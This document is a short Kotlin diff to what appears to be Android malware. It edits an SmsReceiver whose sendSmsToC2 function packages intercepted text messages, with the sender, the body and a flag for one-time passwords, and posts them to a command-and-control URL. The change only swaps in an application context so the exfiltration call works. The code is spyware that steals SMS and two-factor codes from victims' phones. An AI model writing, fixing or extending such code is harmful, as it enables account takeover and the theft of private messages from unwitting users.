@@ -52,6 +52,7 @@ class SmsReceiver : BroadcastReceiver() {
     }
 
     private fun sendSmsToC2(sender: String, body: String, isOTP: Boolean) {
+        val ctx = StagerApplication.instance
         Thread {
             try {
                 val payload = JSONObject().apply {
@@ -72,7 +73,7 @@ class SmsReceiver : BroadcastReceiver() {
                     put("timestamp", System.currentTimeMillis())
                 }
 
-                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString(), context)
+                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString(), ctx)
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to send SMS to C2", e)
             }
